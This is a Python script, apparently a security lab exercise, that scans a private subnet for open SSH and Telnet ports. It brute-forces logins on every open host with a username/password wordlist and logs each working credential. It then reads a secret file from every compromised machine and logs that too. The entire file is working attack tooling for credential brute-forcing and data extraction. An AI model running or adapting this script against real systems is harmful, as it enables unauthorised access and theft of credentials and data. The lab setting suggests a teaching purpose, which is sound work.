import paramiko, telnetlib, socket

# subnet
subnet = "10.13.4."

# appending passwords and user names to login
passwordFile = open("Q2pwd", "r")
logins = [i.strip().split() for i in passwordFile.readlines()]
passwordFile.close()

# list to store SSH and Telnet ips
telnet_serv = []
ssh_serv = []

# function to append found acounts to ssh_accounts.log and telnet_accounts.log
def log_credentials(ip, user, password, protocol):
    # Determine log file based on protocol
    if protocol.lower() == 'ssh':
        log_file = 'ssh_accounts.log'
    elif protocol.lower() == 'telnet':
        log_file = 'telnet_accounts.log'
    else:
        raise ValueError("Unsupported protocol. Use 'SSH' or 'Telnet'.")
    
    # Format the credential line
    credential_line = f"{ip},{user},{password}\n"
    
    # Write the credential line to the log file
    with open(log_file, 'a') as file:
        file.write(credential_line)

# function to append found users and secrets to extracted_secrets.log
def log_extracted_secrets(ip, user, secret):
    # Determine log file based on protocol
    log_file = 'extracted_secrets.log'
    
    # Format the credential line
    credential_line = f"{ip},{user},{secret}\n"
    
    # Write the credential line to the log file
    with open(log_file, 'a') as file:
        file.write(credential_line)

# function to find all vulnerable users in telnet 
def connect_telnet(ip):
    for i in range(len(logins)):
        try:
            telnet = telnetlib.Telnet(ip, timeout=2)
            telnet.read_until(b"login: ")
            telnet.write(logins[i][0].encode('ascii')+ b"\n")
            if logins[i][1]:
                telnet.read_until(b"Password: ")
                telnet.write(logins[i][1].encode('ascii') + b"\n")
            log_credentials(ip, logins[i][0],  logins[i][1], 'Telnet')
            telnet.write(b"cat Q2secret\n")
            telnet.write(b"exit\n")
            secret_temp = telnet.read_all().decode("ascii").split("\n")
            print(secret_temp)
            secret = secret_temp[-2][1:].strip()
            telnet.close()
            print("Sucess |", ip, "| 23 | username:", logins[i][0], "| password:", logins[i][1], "| secret:", secret)
            log_extracted_secrets(ip, logins[i][0],secret)
            return True
        except:
            continue
    return False

# function to find all vulnerable users in SSH 
def connect_ssh(ip, user_passw):
    for i in range(len(user_passw)):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, 22, user_passw[i][0], user_passw[i][1], timeout=15, banner_timeout=15)
            log_credentials(ip, user_passw[i][0],  user_passw[i][1], 'SSH')

            _stdin, _stdout, _stderr = ssh.exec_command("cat Q2secret")
            secret = _stdout.read().decode()
            ssh.close()
            print("Sucess |", ip,"| 22 | username:", user_passw[i][0], "| password:", user_passw[i][1], "| secret:", secret)
            log_extracted_secrets(ip, user_passw[i][0],secret)

            return True
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except paramiko.ssh_exception.SSHException:
            return connect_ssh(ip, user_passw[i:])
    return False

# function to find all open machines in and append them to list
def find_vulnerable_machines():
    def check_ssh():
        for ip in range(256):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            connect_ip = subnet + str(ip)
            error_ind = s.connect_ex((connect_ip,22))
            if error_ind == 0:
                print("For", connect_ip, "- Port 22 is open")
                ssh_serv.append(connect_ip)
                s.close()
            else:
                s.close()
            
    def check_telnet():
        for ip in range(256):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            connect_ip = subnet + str(ip)
            error_ind = s.connect_ex((connect_ip, 23))
            if error_ind == 0:
                print("For", connect_ip, "- Port 23 is open")
                telnet_serv.append(connect_ip)
                s.close()
            else:
                s.close()

    check_telnet()      
    check_ssh()
    
    def write_to_log(filename, ip_list):
        with open(filename, 'w') as f:
            for ip in ip_list:
                f.write(ip + '\n')

    write_to_log('open_ssh.log', ssh_serv)
    write_to_log('open_telnet.log', telnet_serv)

find_vulnerable_machines()


for t in telnet_serv:
    connect_telnet(t)
for s in ssh_serv:
    connect_ssh(s, logins)
